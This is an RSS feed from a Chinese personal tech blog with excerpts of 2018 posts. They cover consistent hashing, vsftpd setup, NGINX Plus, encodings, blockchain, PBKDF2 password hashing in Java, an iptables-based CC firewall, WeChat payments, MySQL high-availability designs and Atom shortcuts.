<?xml version="1.0" encoding="utf-8" standalone="yes" ?>
<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom">
  <channel>
    <title>咖啡系列 on 无心技术簿</title>
    <link>https://www.wuxinvip.com/blog/</link>
    <description>Recent content in 咖啡系列 on 无心技术簿</description>
    <generator>Hugo -- gohugo.io</generator>
    <language>en-us</language>
    <lastBuildDate>Thu, 02 Mar 2017 00:00:00 +0000</lastBuildDate>
    
	<atom:link href="https://www.wuxinvip.com/blog/index.xml" rel="self" type="application/rss+xml" />
    
    
    <item>
      <title>Hash环、一致性hash</title>
      <link>https://www.wuxinvip.com/blog/essay/hash%E7%8E%AF/</link>
      <pubDate>Tue, 10 Jul 2018 00:00:00 +0000</pubDate>
      
      <guid>https://www.wuxinvip.com/blog/essay/hash%E7%8E%AF/</guid>
      <description>   hash环、一致性hash   Hash环
上面说的Hash函数，只经过了1次hash，即把key hash到对应的机器编号。 而Hash环有2次Hash：
 （1）把所有机器编号hash到这个环上 （2）把key也hash到这个环上。然后在这个环上进行匹配，看这个key和哪台机器匹配。  具体来讲，如下：
假定有这样一个Hash函数，其值空间为（0到2的32次方-1) ，也就是说，其hash值是个32位无整型数字 ，这些数字组成一个环。 然后，先对机器进行hash(比如根据机器的ip)，算出每台机器在这个环上的位置； 再对key进行hash，算出该key在环上的位置， 然后从这个位置往前走，遇到的第一台机器就是该key对应的机器，就把该(key, value) 存储到该机器上。 首先计算出每台Cache服务器在环上的位置（图中的大圆圈）；然后每来一个(key, value)，计算出在环上的位置（图中的小圆圈）， 然后顺时针走，遇到的第1个机器，就是其要存储的机器。 这里的关键点是：当你增加/减少机器时，其他机器在环上的位置并不会发生改变。这样只有增加的那台机器、 或者减少的那台机器附近的数据会失效，其他机器上的数据都还是有效的。  数据倾斜问题
当你机器不多的时候，很可能出现几台机器在环上面贴的很近，不是在环上均匀分布。这将会导致大部分数据，都会集中在某1台机器上。 为了解决这个问题，可以引入“虚拟机器”的概念，也就是说：1台机器，我在环上面计算出多个位置。 怎么弄呢？ 假设用机器的ip来hash，我可以在ip后面加上几个编号, ip_1, ip_2, ip_3, .. 把1台物理机器生个多个虚拟机器的编号。 数据首先映射到“虚拟机器上”，再从“虚拟机器”映射到物理机器上。 因为虚拟机器可以很多，在环上面均匀分布，从而保证数据均匀分布到物理机器上面。  ZK的引入
上面我们提到了服务器的机器增加、减少，问题是客户端怎么知道呢？ 一种笨办法就是手动的，当服务器机器增加、减少时候，重新配置客户端，重启客户端。 另外一种，就是引入ZK，服务器的节点列表注册到ZK上面，客户端监听ZK。发现结点数发生变化，自动更新自己的配置。 当然，不用ZK，用一个其他的中心结点，只要能实现这种更改的通知，也是可以的。  </description>
    </item>
    
    <item>
      <title>随便写点</title>
      <link>https://www.wuxinvip.com/blog/essay/essay-2/</link>
      <pubDate>Fri, 06 Jul 2018 00:00:00 +0000</pubDate>
      
      <guid>https://www.wuxinvip.com/blog/essay/essay-2/</guid>
      <description>spring cloud 刚刚上了生产
service mesh、事件驱动架构、来了
rest刚刚成为普遍api规范 GraphQL来了
更NB的是 Netflix 停止维护了eureka、出了个 &amp;ldquo;混沌工程&amp;rdquo;
大公司的技术就像是生产苹果的、小公司的技术就是跟着屁股后头捡捡苹果核儿、、、
大公司吃完了苹果、吃核桃、换着花样吃、小公司跟后头就吃各种核儿、、哈哈、所以一定要进大公司耍耍去、若能玩顶尖的技术、岂不妙哉？
infoq地址
技术更迭的真快、现在还有精力去学习、以后也就看看虎形而已了、
谁说程序员的工资好挣的、一不留神就失业没人要的工作、惶惶度日、不会学习的程序员就是温水的青蛙、安乐死&amp;hellip;</description>
    </item>
    
    <item>
      <title>ftp部署</title>
      <link>https://www.wuxinvip.com/blog/service-deploy/ftp/</link>
      <pubDate>Wed, 04 Jul 2018 00:00:00 +0000</pubDate>
      
      <guid>https://www.wuxinvip.com/blog/service-deploy/ftp/</guid>
      <description>1、首先服务器要安装ftp软件,查看是否已经安装ftp软件下： #which vsftpd 如果看到有vsftpd的目录说明服务器已经安装了ftp软件 2、查看ftp 服务器状态 #service vsftpd status 3、如果没有安装，查询是否有可用的rpm安装包 [root@centos ~]# yum list |grep vsftpd vsftpd.i686 2.2.2-21.el6 base 4、安装vsftpd服务 [root@centos ~]# yum install -y vsftpd 5. 启动ftp服务器 #service vsftpd start 6. 重启ftp服务器 #service vsftpd restart 7. 查看服务有没有启动 [root@centos ~]# netstat -lnp tcp 0 0 0.0.0.0:21 0.0.0.0:* LISTEN 1491/vsftpd 如果看到以上信息，证明ftp服务已经开启。 8.如果需要开启root用户的ftp权限要修改以下两个文件 #vi /etc/vsftpd/ftpusers中注释掉root #vi /etc/vsftpd/user_list中也注释掉root 然后重新启动ftp服务 [root@centos ~]# service vsftpd restart  </description>
    </item>
    
    <item>
      <title>nginx-controller</title>
      <link>https://www.wuxinvip.com/blog/load-balance/nginx-controller/</link>
      <pubDate>Tue, 03 Jul 2018 00:00:00 +0000</pubDate>
      
      <guid>https://www.wuxinvip.com/blog/load-balance/nginx-controller/</guid>
      <description> 好用软件推荐 nginx-plus监控 官方网站-nginx-controller
  密码加密 图谱   简介  NGINX Controller是所有NGINX Plus实例的集中管理平台。 使用Controller，您可以在多云环境中轻松管理多个NGINX Plus服务器。 使用直观的向导样式界面，您可以创建NGINX Plus的新实例，并集中配置负载平衡，URL路由和SSL终止等功能。 Controller具有丰富的监控和警报功能，有助于确保应用程序的可用性，性能和可靠性。 Controller基于最佳实践提供对200个关键指标和抢先推荐的深入可见性， 使ITOps和DevOps团队能够首先避免性能问题，并解决可能出现的任何问题。  功能 实时监控和警报
获得关于应用程序性能的重要见解：
 关键指标的图表，例如每秒请求数，活动连接数，带宽使用情况 根据预定义的阈值提醒100多个指标，如CPU使用率，400/500错误和运行状况检查失败 使用REST API轻松集成您选择的任何监控工具  仪表板
使用以下命令快速监控NGINX plus实例并对其进行故障排除：
 概述仪表板，用于汇总负载均衡器中的指标 应用程序健康评分，用于衡量成功请求和及时响应 可自定义的仪表板，用于监控特定于您的环境的指标  先发制人的建议
使用内置配置分析器获取：
 基于成千上万客户的学习，增强了性能和安全性 通过遵循内置的最佳实践来获得更好的SLA。  抢先和可行的建议：
 组态 安全 SSL状态  简化的配置管理
导航一个简单直观的向导式用户界面，用于：
 NGINX Plus配置的指导工作流程 负载平衡器的按钮部署 流量路由到上游服务器 SSL密钥和证书管理  政策驱动的管理
通过开发多个特定于环境的策略来加速应用程序部署。创建配置环境：
 分期 生产 具体业务范围  </description>
    </item>
    
    <item>
      <title>nginx-plus</title>
      <link>https://www.wuxinvip.com/blog/load-balance/nginx-plus/</link>
      <pubDate>Tue, 03 Jul 2018 00:00:00 +0000</pubDate>
      
      <guid>https://www.wuxinvip.com/blog/load-balance/nginx-plus/</guid>
      <description>好用软件推荐 简化部署、多云环境更容易发现服务的故障 结合nginx-controller非常好用软件 官方网站-nginx-plus
简介  NGINX Plus是一个基于开源NGINX构建的软件负载均衡器，Web服务器和内容缓存。 NGINX Plus在开源产品的基础上提供独家的生产就绪功能，包括会话持久性，通过API配置和主动健康检查。 使用NGINX Plus代替硬件负载均衡器，获得创新的自由，而不受基础设施的限制。  功能 负载均衡器
使用软件扩展传统的负载平衡：
 HTTP，TCP和UDP负载平衡 使用URI，cookie，args等进行第7层请求路由 基于cookie的会话持久性* 状态代码和响应正文的主动运行状况检查* 使用DNS *进行服务发现  内容缓存
使用为世界上最大的CDN提供支持的相同缓存：
 缓存静态和动态内容 通过微处理提高动态内容性能 在后台重新验证时提供“陈旧”内容以提高性能 覆盖或设置Cache‑Control标题 使用缓存清除API轻松管理缓存*  网络服务器
以无与伦比的速度和效率交付静态资产：
 同时处理数十万客户 使用比其他Web服务器少90％的内存 反向代理多个协议：HTTP，gRPC，Memcached，PHP-FPM，SCGI，uwsgi 流HTTP视频：FLV，HDS，HLS，MP4 支持HTTP / 2服务器推送的HTTP / 2网关  安全控制
保护您的应用：
 请求/连接限制 双栈RSA / ECC SSL卸载 IP访问控制列表（ACL） API和OpenID Connect单点登录（SSO）的JWT身份验证* NGINX WAF动态模块*  动态模块
动态插入其他功能：
 用于JavaScript配置的nginScript模块 GeoIP模块按IP地址定位用户（需要MaxMind GeoIP数据库） 用于编译自己的自定义模块的构建工具 单点登录模块：ForgeRock，IDF Connect和Ping Identity * 动态模块库*  监控</description>
    </item>
    
    <item>
      <title>关于编码方式</title>
      <link>https://www.wuxinvip.com/blog/essay/%E7%BC%96%E7%A0%81%E6%96%B9%E5%BC%8F/</link>
      <pubDate>Tue, 03 Jul 2018 00:00:00 +0000</pubDate>
      
      <guid>https://www.wuxinvip.com/blog/essay/%E7%BC%96%E7%A0%81%E6%96%B9%E5%BC%8F/</guid>
      <description>编码
将人类语言解释为机器语言的一种关系映射  常见编码方式
ASCII
128个 0-31控制字符、换行、删除、回车 32-126打印字符  ISO8859-1
在ASCII上 加上了大多数修语言字符、256个字符  GB2312
信息交换用汉字编码字符集基本集、双字节编码、 A1-A9 符号区 B0-F7 汉字区  GBK
汉字内码扩展规范 对GB2312扩展 编码范围 8140-FEFE 与GB2312兼容  GB18030
数字交换用汉字编码字符集 单字节、双字节、四字节、与GB2312兼容  UTF-16
Unicode字符集的存取方法 使用2字节标识Unicode转化格式、定长表示  UTF-8 边长字符集、1-6个字节 涵盖了所有各国字符编码
UTF-8mb4
在UTF8基础上 增加了表情字符  </description>
    </item>
    
    <item>
      <title>区块链 概述、开源</title>
      <link>https://www.wuxinvip.com/blog/block-chain/block-chain-3/</link>
      <pubDate>Tue, 03 Jul 2018 00:00:00 +0000</pubDate>
      
      <guid>https://www.wuxinvip.com/blog/block-chain/block-chain-3/</guid>
      <description>开源地址
前言 这是区块链相关知识的一个梳理，旨在真正的get the skill并方便他人。
知识可分为两类:
 逻辑体系型的  需要思考，把各种概念连起来，或归纳，或演绎，最后，在大脑中形成一种逻辑网状结构。比如可计算理论，分布式系统，解释器等。
 使用操作型的  基本不需要思考，只需要看一下目录，要用的时候参考一下手册即可。比如linux的各种命令，go,python的一些奇怪语法,elastic-search dsl的使用。
第一类知识是比较有意思的，值得多花时间，这种&amp;rdquo;逻辑网状结构&amp;rdquo;最后会形成一个&amp;rdquo;打通&amp;rdquo;的集群，可能会让你的大脑产生一些有意思的想法；而第二类，千万别花太多时间，因为很有可能让你产生消极，厌学，忧郁等情绪，而你越努力，就越可能&amp;rdquo;斯德哥尔摩&amp;rdquo;。
区块链知识可以归为第一类。
研究一个东西，需要知道它包含哪些概念，我把它分为两类:
 自描述概念  不依赖其他概念的概念 * 他描述概念
需要依赖其他概念的概念
显然，这是一个递归的概念，可以用形式化的语言来描述，你也可以哲学的扯一大堆，但这不是我的兴趣。
下面的章节试图用*原理，逻辑，应用*的方式把区块链相关的概念连起来，形成”网状结构“，所有概念可在Glossary(词汇表)里查看，你可以先浏览一下，想一想他们之间的关系，再来看下面的章节。当然，最后，每个人的&amp;rdquo;网状结构&amp;rdquo;可能都不同，毕竟除了&amp;rdquo;同一性&amp;rdquo;，还有&amp;rdquo;差异性&amp;rdquo;。但，原则是一致的，有了&amp;rdquo;网状结构&amp;rdquo;，在添加新的&amp;rdquo;概念&amp;rdquo;时，我们就可以审视其在&amp;rdquo;网&amp;rdquo;中的位置，也可以思考这张&amp;rdquo;网&amp;rdquo;还缺少什么，有什么不完美之处，是不是还有&amp;rdquo;孤岛&amp;rdquo;等问题，进而有可能去完善它。
而所有的学习，无非就是完善那张网，并尽可能的正交。
这样，垃圾少了，人也轻松了。
原理 1. KV(key value)  There are only two hard things in Computer Science: cache invalidation and naming things.
&amp;ndash; Phil Karlton
 为什么名字那么重要？因为有了名字，这个名字才能够被引用，才能够谈论其属性。
就是说，你要谈论一个人，首先得有这个人，这有点废话，但却是原理性的，
名字意味着什么？
图灵机里面的head,没错，只有你找到head,才知道当前的(input,state),才能往下走。
汇编语言如果没有address,存储和操作也没法进行;各种编程语言的变量说的也是这个事情。
而kv中的k其实就是名字，v在不同的场合可以有不同的含义。
有了kv,就可以构造所有的数据结构，因为从递归的角度，v也可以是kv。
这个跟blockchain有关系吗？
2. Asset(资产) 在digital asset的世界，address上的数字就是资产。显然，address是key,数字是value。 理解这一点很重要，blockchain主要主要的应用场景就是数字资产。
不太精确的分类:
 资产数字化  相当于一个凭证，其有现实的对应物，比如股票，其实对应公司的投票分红等权利。</description>
    </item>
    
    <item>
      <title>慢哈希加密</title>
      <link>https://www.wuxinvip.com/blog/encryption/password-java-pbkdf2/</link>
      <pubDate>Mon, 02 Jul 2018 00:00:00 +0000</pubDate>
      
      <guid>https://www.wuxinvip.com/blog/encryption/password-java-pbkdf2/</guid>
      <description>PBKDF2算法【三种】介绍：
wiki
加盐密码哈希：如何正确使用
PBKDF2加密的实现
//PBKDF2 import javax.crypto.SecretKeyFactory; import javax.crypto.spec.PBEKeySpec; import java.math.BigInteger; import java.security.NoSuchAlgorithmException; import java.security.SecureRandom; import java.security.spec.InvalidKeySpecException; /** * Created by huoyan403 on 3/21/2017. */ public class PasswordEncryption { public static final String PBKDF2_ALGORITHM = &amp;quot;PBKDF2WithHmacSHA1&amp;quot;; // The following constants may be changed without breaking existing hashes. /** * 盐的长度---不宜过短 */ public static final int SALT_BYTE_SIZE = 48 / 2; /** * 生成密文的长度 */ public static final int HASH_BYTE_SIZE = 32 / 2; /** * 迭代次数 */ public static final int PBKDF2_ITERATIONS = 1000; public static final int ITERATION_INDEX = 0; public static final int SALT_INDEX = 1; public static final int PBKDF2_INDEX = 2; /** * Returns a salted PBKDF2 hash of the password.</description>
    </item>
    
    <item>
      <title>谈谈区块链对互联网的冲击</title>
      <link>https://www.wuxinvip.com/blog/block-chain/block-chain-0/</link>
      <pubDate>Mon, 02 Jul 2018 00:00:00 +0000</pubDate>
      
      <guid>https://www.wuxinvip.com/blog/block-chain/block-chain-0/</guid>
      <description> 区块链 起源于比特币、不对、应该是说、区块链理论的第一应用是比特币
是日本一位大佬、看透了金融行业金融机构对货币的管理和控制能力、 金融机构可以任意发行货币、日本那次经济危机有关吧、
区块链涉及的新技术 有：
 去中心化、采取共识机制来获取最值得信任的交易链、 智能合约、不借助第三方签订协议、这种协议一旦生效不可修改、可追溯  去中心化：
现在互联网技术的交易基本上都是有第三方担保、比如淘宝的支付宝、以及货币发行机构各大银行 这种新技术是怎么改变互联网世界的架构的呢？ 首先这种不适用第三方担保的协议、可以无视第三方支付平台的兴衰而动荡、  然后结合去中心化和智能合约、有些人头一次接触这种思维方式、于是很多人的思考就诞生了一波思维风暴
银行去中心化、货币去中心化、法律去中心化、等等各个行业的去中心化、共识机制、其实我觉得蛮不现实的、 机器会共识、人可不一定、人心可以收买的、没有一个良好的信任体系、共识机制也只是一个泡沫而已
再说智能合约、法律智能合约、货币交易智能合约、物联网智能合约、也是各个方面各个行业都可以嵌入
智能合约可以用来在多方的情况下、动态的签署一份使用合约、随后由去中心化的货币再进行支付自动转账
 法律：甲乙丙三方 签订一个合约、到期后合约执行、货币支付或者行为交易、这份合约保存到信任链条中永久保存 物联网：家电、车、购物、都可以接入智能合约、进行一个行为合约、然后通知货币链支付  看起来就一个完全自由化的社会
关于共识机制的解决方案
公有链——对任何人开放，任何人都能参与 公有链通常也称为非许可链（Permissionless Blockchain）， 任何人都可以参与区块链数据维护和读取，容易部署应用程序，完全去中心化不受任何机构控制。 公有链的应用非常广泛，例如资产证券化、数字资产的跨链流通 ……现在市场上的主流大势区块链项目比特币、以太坊、量子链、EOS、唯链以及Neo等都是公有链项目。 公有链是真正意义上的完全去中心化的区块链，它通过密码学保证交易不可篡改，同时也利用密码学验证以及经济上的激励， 在互为陌生的网络环境中建立共识，从而形成去中心化的信用机制。在公有链中的共识机制一般是工作量证明（PoW）和权益证明（PoS） 。 公有链具有通过去中介化的方式打破当前中心化商业模式的潜力， 而且本身无需维护服务器或管理系统，从根本上降低创建和运行去中心化应用程序（dApp）的成本。  联盟链——仅对联盟成员开放 联盟链是一种需要注册许可的区块链，这种区块链也称为许可链（Permissioned Blockchain）。 联盟链仅限于联盟成员参与，联盟规模可以大到国与国之间，也可以是不同的机构企业之间。 区块链上的读写权限、参与记账权限按联盟规则来制定。 整个网络由成员机构共同维护，网络接入一般通过成员机构的网关节点接入，共识过程由预先选好的节点控制。 因此联盟链一般不采用工作量证明的挖矿机制，而是多采用权益证明（PoS）或PBFT（Practical Byzantine Fault Tolerant）、RAFT等共识算法。 和公有链最高每秒完成交易3-20相比，联盟链可以达到1000-10000 ，交易速度更快且交易成本大幅降低。 联盟链可以解决结算问题，降低两地结算的成本和时间，适合于机构间的交易、结算等B2B场景，因此金融行业应用最广泛。 其中最知名的就是R3CVE组织，即R3联盟，有包括花旗银行、中国平安银行、纽约梅隆银行在内的50多家银行机构加入  私有链——仅行业内部透明，不对外开放 私有链，仅限于企业、国家机构或者单独个体使用，不完全能够解决信任问题，但是可以改善可审计性。 常用于企业内部的数据库管理、审计等，政府的预算和执行，或者政府的行业统计数据等。 他们彼此之间需要透明，但没必要对外公众透明。 私有链的价值主要是提供安全、可追溯、不可篡改、自动执行的运算平台， 可以同时防范来自内部和外部对数据的安全攻击，这个在传统的系统是很难做到的。 任何人都可以创建私链的平台的Multichain项目本身就是一个私有链项目。  另：
 不管区块链是不是泡沫。反正各大佬已经部署未来了、阿里、腾讯、百度、京东也在看形势、 还有众多小企业在瞄准区块链猛打擦边球、毕竟这是一个机会也是一个机遇、不走未必能活、走了就可能一夜发达、 互联网时代、数据时代、人工智能时代、区块链时代、 小视频时代、老博客时代、共享社会、 这个世界、名词化社会、动不动就我们重新定义了XXX、、、、、这样拉融资也算个噱头、、 不过也可以看出机遇、机会是真的多、看准未来【未来在变、我们也要变】、and 、坚持以获成功  </description>
    </item>
    
    <item>
      <title>Tengine</title>
      <link>https://www.wuxinvip.com/blog/github/tengine/</link>
      <pubDate>Sun, 01 Jul 2018 00:00:00 +0000</pubDate>
      
      <guid>https://www.wuxinvip.com/blog/github/tengine/</guid>
      <description>基于nginx更强大的web服务器负载均衡器 简介 Tengine是由淘宝网发起的Web服务器项目。它在Nginx的基础上，针对大访问量网站的需求，添加了很多高级功能和特性。 Tengine的性能和稳定性已经在大型的网站如淘宝网，天猫商城等得到了很好的检验。 它的最终目标是打造一个高效、稳定、安全、易用的Web平台。
从2011年12月开始，Tengine成为一个开源项目，Tengine团队在积极地开发和维护着它。 Tengine团队的核心成员来自于淘宝、搜狗等互联网企业。 Tengine是社区合作的成果，我们欢迎大家参与其中，贡献自己的力量。
Tengine文档 http://tengine.taobao.org
https://github.com/alibaba/tengine</description>
    </item>
    
    <item>
      <title>基于Strom的日志实时流量分析主动防御(CCFirewall)系统</title>
      <link>https://www.wuxinvip.com/blog/github/cc-iptable/</link>
      <pubDate>Sun, 01 Jul 2018 00:00:00 +0000</pubDate>
      
      <guid>https://www.wuxinvip.com/blog/github/cc-iptable/</guid>
      <description>CC防火墙 github 地址 简介 CC防火墙的架构采用Flume+Kafka+Strom+Zookeeper+Mysql实现,实现异常IP的及时封停功能
组件  Flume :部署在所有的Nginx服务器上，将Nginx日志推送至Kafka中， Kafka : 临时存储Nginx的log数据 Strom ：从Kafka取数据并进行数据分析 Zookeeper ：存储CC防火墙的配置文件，并且所有部署在Squid上的客户端也注册在这个Zookeeper上。 Agent ：部署在每台Squid上，并且信息注册到Zookeeper的临时节点上，接收到封停指令后通过iptables封锁IP。  Strom拓扑  KafkaSpOut：进行Kafka数据的读取，这里为了方便与简单，并且保证顺序性Kafka内只是用一个Partion。 LogFormatBolt : 收到KafkaSpout读取出的Nginx日志后进行格式化处理，并在此使用纯真库进行IP GEO匹配 IpAnalysis ： 几乎所有的逻辑都在这里实现，如IP的计数器，报警的匹配等等，为了可以动态调整防火墙的配置，配置文件保存在Zookeeper中，也是在这里Watch Zookeeper的节点，达到动态改变配置的。 BlockBolt ： 接收到IpAnalysis 发送的信息后，将异常的信息通过Thrift发送给各个Squid机器。 UnBlockBolt ： 接收到BlockBolt成功封锁后的IP后经过一段时间进行解封。 BlockReportBlot ： 做数据统计用的，对整体的作用不大 xStoreBolt ： 数据库存储Bolt，拓扑上的IPStoreBolt，BlockStoreBolt，BlockReportStoreBolt 都是使用的这一个Bolt。  Thrit封存解封接口 service CCfirewall{ string blockipbyiptables(1:string mkey,2: string ip) string unblockipbyiptables(1:string mkey,2: string ip) }  Zookeeper目录 目录树
. └─ccfirewall ├─config //存储防火墙配置信息 └─agent_list //存储Agent列表 └─iptables //使用iptables封锁的站点 ├─10.</description>
    </item>
    
    <item>
      <title>微信H5支付</title>
      <link>https://www.wuxinvip.com/blog/essay/weichat-h5-pay/</link>
      <pubDate>Sat, 30 Jun 2018 00:00:00 +0000</pubDate>
      
      <guid>https://www.wuxinvip.com/blog/essay/weichat-h5-pay/</guid>
      <description>微信支付流程   微信支付流程 大概就是这个样子、也包括支付宝、各大银联差不多一个流程、也就是传递的参数略有不同
 用户通过客户端下一个订单、 后台根据用户下的商品来生成一个订单、 然后可以有一个订单确认页面 以显示订单是否完整 之后确认订单、把订单信息发送给微信 生成预支付信息【订单需要支付了、我告诉微信一下、我这有个订单要用你的支付了】 之后用微信返回的预支付信息来调起微信支付【微信表示我收到了、我给你个密钥、你用它去找我的管家要钱就行了】 用户输入密码、确认支付【用户拿着密钥找管家、我要买这个、这是我的账户密码】 支付完成、微信告诉客户端的服务器、他买完了、并且成功了、【微信大佬告诉你后台&amp;rdquo;也就是你老婆&amp;rdquo;你丈夫在我这买了个这个】  核心部分是这么个流程
当然 再接入微信支付前 要判断你对这个网站的拥有权 需要在你的服务器 上传一个文件作为验证、这个跟站长在百度等各大搜索引擎验证身份一个意思
还要配置 回调地址 以防止数据被篡改、保证安全性、
对于服务之间的通信全程都是https加密类型-混合型加密技术</description>
    </item>
    
    <item>
      <title>MySQL经典架构</title>
      <link>https://www.wuxinvip.com/blog/mysql/mysql-solution/</link>
      <pubDate>Fri, 29 Jun 2018 00:00:00 +0000</pubDate>
      
      <guid>https://www.wuxinvip.com/blog/mysql/mysql-solution/</guid>
      <description>mysql主从复制
此种架构，一般初创企业比较常用，也便于后面步步的扩展
  此架构特点：
 1、成本低，布署快速、方便 2、读写分离 3、还能通过及时增加从库来减少读库压力 4、主库单点故障 5、数据一致性问题（同步延迟造成）  MySQL+MMM架构
通过 DRBD 基于 block 块的复制模式，快速进行双主故障切换，很大程度上解决主库单点故障问题
  此架构特点：
 1、高可用软件可使用 Heartbeat, 全面负责 VIP、数据与 DRBD 服务的管理 2、主故障后可自动快速切换，并且从库仍然能通过 VIP 与新主库进行数据同步 3、从库也支持读写分离，可使用中间件或程序实现  MySQL+DRDB架构
MHA 目前在 Mysql 高可用方案中应该也是比较成熟和常见的方案，它由日本人开发出来，在 mysql 故障切换过程中，MHA 能做到快速自动切换操作，而且还能最大限度保持数据的一致性
  此架构特点：
 1、安装布署简单，不影响现有架构 2、自动监控和故障转移 3、保障数据一致性 4、故障切换方式可使用手动或自动多向选择 5、适应范围大（适用任何存储引擎）  MySQL+MHA架构
MMM 即 Master-Master Replication Manager for MySQL（mysql 主主复制管理器），是关于 mysql 主主复制配置的监控、故障转移和管理的一套可伸缩的脚本套件（在任何时候只有一个节点可以被写入），这个套件也能基于标准的主从配置的任意数量的从服务器进行读负载均衡，所以你可以用它来在一组居于复制的服务器启动虚拟 ip，除此之外，它还有实现数据备份、节点之间重新同步功能的脚本。 MySQL 本身没有提供 replication failover 的解决方案，通过 MMM 方案能实现服务器的故障转移，从而实现 mysql 的高可用。</description>
    </item>
    
    <item>
      <title>语音交互</title>
      <link>https://www.wuxinvip.com/blog/ai/yuyin-001/</link>
      <pubDate>Fri, 29 Jun 2018 00:00:00 +0000</pubDate>
      
      <guid>https://www.wuxinvip.com/blog/ai/yuyin-001/</guid>
      <description> 语音交互发展史 语音交互简介
语音合成【在线、离线】 语音识别【听写、转写、唤醒】 语义理解【AIUI】 语音识别模块【麦克风阵列、语音合成芯片、离线识别模块】 模式识别【人脸识别、声纹识别】 语音扩展【语音测评、机器翻译】  语音交互应用场景
导航 智能设备  语音交互组件
AI   </description>
    </item>
    
    <item>
      <title>atom 快捷键</title>
      <link>https://www.wuxinvip.com/blog/essay/atom/</link>
      <pubDate>Thu, 28 Jun 2018 00:00:00 +0000</pubDate>
      
      <guid>https://www.wuxinvip.com/blog/essay/atom/</guid>
      <description>   英文 中文 快捷键     New Window 新建界面窗口 Ctrl + Shift + N   New File 新建文件 Ctrl + N   Open File 打开文件 Ctrl + O   Open Folder 打开文件夹 Ctrl + Shift + O   Add Project Folder 加载项目目录 Ctrl + Alt + O   Reopen Last Item 重新加载上次项目 Ctrl + Shift + T   Save 保存文件 Ctrl + S   Save As 另存为 Ctrl + Shift +S   Close Tab 关闭当前编辑文档 Ctrl + W   Close Window 关闭编辑器 Ctrl + Shift + W   Undo 撤销 Ctrl + Z   Redo 重做 Ctrl + Y   Cut 剪切 Shift + Delete   Copy 复制 Ctrl + Insert   Copy Path 复制文档路径 Ctrl + Shift + C   Paste 粘贴 Shift + Insert   Select All 全选 Ctrl + A   Select Encoding 选择编码 Ctrl + Shift +U   Go to Line 跳转到某行 Ctrl + G   Slect Grammar 语法选择 Ctrl + Shift + L   Reload 重载 Ctrl+ Alt +R   Toggle Full Screen 全屏 F11   Increase Font Size 增大字体 Ctrl + Shift + “+”   Decrease Font Size 减小字体 Ctrl + Shift + “-“   Toggle Tree View 展示隐藏目录树 Ctrl + （竖杠）   Toggle Commadn palette 全局搜索面板 Ctrl + Shift + P   Select Line 选定一行 Ctrl + L   Select First Character of Line 选定光标至行首 Shift + Home   Slect End of Line 选定光标至行尾 Shift + End   Select to Top 选定光标处至文档首行 Ctrl + Shift + Home   Select to Bottom 选定光标处至文档尾行 Ctrl + Shfit + End   Find in Buffer 从缓存器搜索 Ctrl + F   Replace in Buffer 高级替换 Ctrl + Shift + F   Select Next 匹配选定下一个 Ctrl + D   Select All 匹配选定所有 Alt + F3   Find File 查询文件,选定打开 Ctrl + P   Delte End of Word 删除光标处至词尾 Ctrl + Del   Duplicate Line 复制行 Ctrl + Shift + D   Delete Line 删除一行 Ctrl + Shift + K   Toggle Comment 启用注释 Ctrl + /   Toggle developer tools 打开Chrome调试器 Ctrl + Alt + I   Indent 增加缩进 Ctrl + [   Outdent 减少缩进 Ctrl + ]   Move Line Up 行向上移动 Ctrl + up   Move Line Down 行向下移动 Ctrl + Down   Join Lines 行链接 Ctrl + J   newline-below 光标之下增加一行 Ctrl + Enter   editor:newline-above 光标之上增加一行 Ctrl + Shift + Enter   pane:show-next-item 切换编辑的标签页 Ctrl + Tab   Fuzzy Finder 文件跳转面板 Ctrl + T   Select Line Move above 选中行上移 Ctrl + up   Select Line Move below 选中行下移 Ctrl + down   Symbol-view 进入变量、函数跳转面板。 Ctrl + R    </description>
    </item>
    
    <item>
      <title>我的技术图谱</title>
      <link>https://www.wuxinvip.com/blog/essay/%E6%88%91%E7%9A%84%E6%8A%80%E6%9C%AF%E5%9B%BE%E8%B0%B1/</link>
      <pubDate>Sun, 24 Jun 2018 00:00:00 +0000</pubDate>
      
      <guid>https://www.wuxinvip.com/blog/essay/%E6%88%91%E7%9A%84%E6%8A%80%E6%9C%AF%E5%9B%BE%E8%B0%B1/</guid>
      <description> 此技术图谱个人技术内容绘制 包含内容java后台常见技术栈
   图谱分类 描述内容     DB 数据库、mysql   事务 java事务、分布式事务、db事务   分布式 常见分布式架构   协议 常见协议   各大开源组件解析 dubbo、data-es   密码加密 密码加密发展史、破解史   搜索引擎 es搜索引擎   权限 shiro 、数据权限、oauth认证   消息中间件 kafka、rocketmq、rabbitmq、zeromq   算法 常见排序算法、分布式算法、缓存算法、一致性算法   线程 java线程   缓存 缓存组件   设计模式 java设计模式   负载均衡 分布式流量负载   锁 java锁、分布式锁      </description>
    </item>
    
    <item>
      <title>智能合约 简介</title>
      <link>https://www.wuxinvip.com/blog/block-chain/block-chain-1/</link>
      <pubDate>Sat, 23 Jun 2018 00:00:00 +0000</pubDate>
      
      <guid>https://www.wuxinvip.com/blog/block-chain/block-chain-1/</guid>
      <description> 智能合约发展史
区块链发展  智能合约简介
智能合约是“执行合约条款的计算机交易协议”。 [3] 区块链上的所有用户都可以看到基于区块链的智能合约。但是，这会导致包括安全漏洞在内的所有漏洞都可见，并且可能无法迅速修复。 [4]这样的攻击难以迅速解决，例如，2016年6月The DAOEther的漏洞造成损失5000万美元，而开发者试图达成共识的解决方案。 [5] DAO的程序在黑客删除资金之前有一段时间的延迟。以太坊软件的一个硬分叉在时限到期之前完成了攻击者的资金回收工作。 [6]以太坊智能合约中的问题包括合约编程Solidity、编译器错误、以太坊虚拟机错误、对区块链网络的攻击、程序错误的不变性以及其他尚无文档记录的攻击。[7]  智能合约应用场景
智慧链：通证token经济设计、 以太坊智能合约 区块链技术 智能合约审计  智能合约组件
连接物联网必要组成部分  智能合约集群
区块链技术   </description>
    </item>
    
    <item>
      <title>hadoop 简介</title>
      <link>https://www.wuxinvip.com/blog/big-data/hadoop/hadoop-1/</link>
      <pubDate>Wed, 20 Jun 2018 00:00:00 +0000</pubDate>
      
      <guid>https://www.wuxinvip.com/blog/big-data/hadoop/hadoop-1/</guid>
      <description>hadoop发展史
Hadoop Apache Lucene创始人Doug Cutting 创建 基于 Nutch开发 本身也是lucence一部分
2004年 Doug Cutting 和Mike Cafarella 实现 HDFS和MapReduce初版
2005年 Nutch移植到新框架 Hadoop再20个节点稳定运行
